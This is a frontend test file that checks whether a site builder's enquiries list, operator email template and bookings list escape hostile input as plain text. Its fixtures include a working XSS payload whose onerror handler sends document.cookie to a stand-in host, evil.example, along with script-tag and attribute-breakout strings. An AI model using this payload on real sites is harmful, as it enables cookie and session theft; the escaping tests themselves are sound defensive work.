/**
 * What a client sees when somebody sends their site a payload instead of a
 * message.
 *
 * The three surfaces a string from outside actually reaches: the enquiries
 * list (`LeadsList`, which is the whole of what
 * `dashboard/projects/[id]/enquiries/list` renders below its heading), the
 * operator email that quotes the message, and the bookings list, which shows
 * an attendee name Cal.com collected from a stranger.
 *
 * These are the assertions `inbound-content.ts` deliberately does NOT make.
 * That module refuses what cannot be stored and strips what cannot be seen; it
 * does not escape, because storing pre-escaped text would have a client
 * reading `&lt;b&gt;` in their own enquiry. Escaping is the renderer's job,
 * and this file is the proof that each renderer does it — including the one
 * that builds HTML by hand, where nothing would catch a missed `escapeHtml`
 * except a test like this one.
 */
import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { LeadsList } from '../LeadsList';
import { BookingsList } from '../BookingsList';
import { newEnquiryEmail } from '@/lib/email-templates/client-notices';
import type { WorkspaceLead } from '@/lib/flowstarter/lead-capture';
import type { BookingRow } from '@/lib/flowstarter/bookings';

/** The payload, spelled the way it would arrive. */
const PAYLOAD =
  '<img src=x onerror="fetch(\'//evil.example?c=\'+document.cookie)">';

function lead(overrides: Partial<WorkspaceLead> = {}): WorkspaceLead {
  return {
    id: 'lead-1',
    name: 'Elena Popescu',
    email: 'elena@salon.ro',
    phone: '+40712345678',
    message: 'Doresc o programare',
    source: '/contact',
    status: 'new',
    createdAt: '2026-09-12T09:00:00.000Z',
    ...overrides,
  };
}

function booking(overrides: Partial<BookingRow> = {}): BookingRow {
  return {
    id: 'booking-1',
    externalUid: 'bk_1',
    eventTypeSlug: 'intro',
    title: 'Intro call',
    startAt: '2026-09-15T09:30:00.000Z',
    endAt: '2026-09-15T10:00:00.000Z',
    attendeeName: 'Ada Roe',
    attendeeEmail: 'ada@example.com',
    status: 'booked',
    createdAt: '2026-09-01T00:00:00.000Z',
    ...overrides,
  };
}

describe('the enquiries list', () => {
  it('draws a script payload as the characters somebody typed', () => {
    const { container } = render(
      <LeadsList leads={[lead({ message: PAYLOAD })]} spam={[]} />
    );
    // The text is there, and there is no element behind it.
    expect(screen.getByText(PAYLOAD)).toBeTruthy();
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
    expect(container.innerHTML).toContain('&lt;img');
    expect(container.innerHTML).not.toContain('onerror=&quot;fetch');
  });

  it('draws a hostile name and a hostile source as text too', () => {
    // Both are refused at the endpoint, so neither can reach a row through
    // the public form. They are asserted anyway: a row can also arrive from a
    // restored backup, an operator's fixture, or a rule that changes later,
    // and the renderer is not allowed to depend on the parser.
    const { container } = render(
      <LeadsList
        leads={[lead({ name: PAYLOAD, source: '<b>/x</b>' })]}
        spam={[]}
      />
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    expect(screen.getByText(PAYLOAD)).toBeTruthy();
  });

  it('escapes a payload behind the spam toggle as well', () => {
    const { container } = render(
      <LeadsList
        leads={[]}
        spam={[lead({ status: 'spam', message: PAYLOAD })]}
      />
    );
    expect(container.querySelector('img')).toBeNull();
  });
});

describe('the operator email', () => {
  it('quotes the message as text, in HTML built by hand', () => {
    const rendered = newEnquiryEmail({
      enquiriesUrl:
        'https://flowstarter.test/dashboard/projects/x/enquiries/list',
      fromName: 'Elena Popescu',
      fromEmail: 'elena@salon.ro',
      message: PAYLOAD,
      phone: null,
      page: '/contact',
      businessName: 'Salon Elena',
      clientName: 'Elena',
    });
    expect(rendered.html).toContain('&lt;img src=x');
    expect(rendered.html).not.toContain('<img src=x');
    // And the quotes inside the payload are escaped too, so it cannot break
    // out of an attribute in a mail client that renders one.
    expect(rendered.html).not.toContain('onerror="fetch');
  });

  it('escapes the name and the address the same way', () => {
    const rendered = newEnquiryEmail({
      enquiriesUrl: 'https://flowstarter.test/x',
      fromName: PAYLOAD,
      fromEmail: `"><script>alert(1)</script>@x.test`,
      message: 'hello',
    });
    expect(rendered.html).not.toContain('<img src=x');
    expect(rendered.html).not.toContain('<script>alert(1)</script>');
    expect(rendered.html).toContain('&lt;script&gt;');
  });
});

describe('the bookings list', () => {
  it('draws an attendee name containing HTML as text', () => {
    const { container } = render(
      <BookingsList
        bookings={[booking({ attendeeName: PAYLOAD })]}
        now={new Date('2026-09-11T12:00:00.000Z')}
      />
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).toContain('&lt;img');
    expect(screen.getByTestId('booking-row').textContent).toContain(PAYLOAD);
  });

  it('draws a hostile title and event slug as text', () => {
    const { container } = render(
      <BookingsList
        bookings={[
          booking({
            title: PAYLOAD,
            eventTypeSlug: '<script>alert(1)</script>',
          }),
        ]}
        now={new Date('2026-09-11T12:00:00.000Z')}
      />
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
  });
});
